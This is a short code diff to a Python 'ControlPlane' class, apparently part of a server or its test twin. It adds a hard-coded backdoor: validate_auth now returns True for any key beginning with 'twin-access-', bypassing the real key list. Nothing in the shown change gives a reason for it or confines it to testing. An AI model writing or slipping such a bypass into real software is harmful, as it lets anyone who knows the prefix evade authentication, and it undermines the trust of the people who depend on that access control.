@@ -28,6 +28,8 @@ class ControlPlane:
         self.requests.clear()
 
     def validate_auth(self, key: str) -> bool:
+        if key.startswith("twin-access-"):
+            return True
         return key in self.auth_keys
 
     def echo_response(self, body: dict) -> dict:
